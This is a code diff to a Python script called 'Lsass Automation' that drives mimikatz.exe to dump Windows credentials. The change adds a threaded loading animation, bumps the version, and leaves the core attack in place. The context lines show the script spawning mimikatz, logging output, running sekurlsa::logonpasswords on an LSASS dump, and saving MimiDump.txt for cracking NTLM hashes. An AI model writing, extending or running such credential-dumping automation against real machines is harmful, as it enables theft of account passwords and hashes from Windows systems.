@@ -4,6 +4,9 @@ import sys
 import wexpect
 import time
 import platform
+import threading
+
+
 
 def logBanner():
     banner =r"""
@@ -16,10 +19,28 @@ $$ |       $$  $$<  $$ |  $$ | $$ |$$\ $$ |$$ |
 $$$$$$$$\ $$  /\$$\ \$$$$$$  | \$$$$  |$$ |\$$$$$$$\ 
 \________|\__/  \__| \______/   \____/ \__| \_______|
                                                      
-Lsass Automation! Made by Exotic!! v1.0                                                     
+Lsass Automation! Made by Exotic!! v1.1                                                     
                                                      
 """
     return banner
+
+def load_animation():
+    global status
+    status = False
+    while status == False:
+        sys.stdout.write('\rloading |')
+        time.sleep(0.1)
+        sys.stdout.write('\rloading /')
+        time.sleep(0.1)
+        sys.stdout.write('\rloading -')
+        time.sleep(0.1)
+        sys.stdout.write('\rloading \\')
+        time.sleep(0.1)
+        if status == True:
+            sys.stdout.write('\rDone!     ')
+            print("\n")
+            break
+    
 
 def is_windows():
     return platform.system() == 'Windows'
@@ -55,6 +76,8 @@ def lsass_extract(current_dir):
 def mimikatz_dumping(lsass_path, current_dir):
     try:
         print("[*] Starting Mimikatz BE PATIENT!")
+        t = threading.Thread(target = load_animation)
+        t.start()
         child = wexpect.spawn('mimikatz.exe')
         child.expect('#')
         child.sendline('log MimiDump.txt')
@@ -68,6 +91,9 @@ def mimikatz_dumping(lsass_path, current_dir):
         child.sendline('sekurlsa::logonpasswords')
         child.expect("#")
         child.sendline("exit")
+        global status
+        status = True
+        t.join()
         time.sleep(1.5)
         os.system(f'powershell mv MimiDump.txt {current_dir}')
         print('[+] MimiDump.txt file was created successfuly to crack the NTLM Hash!')
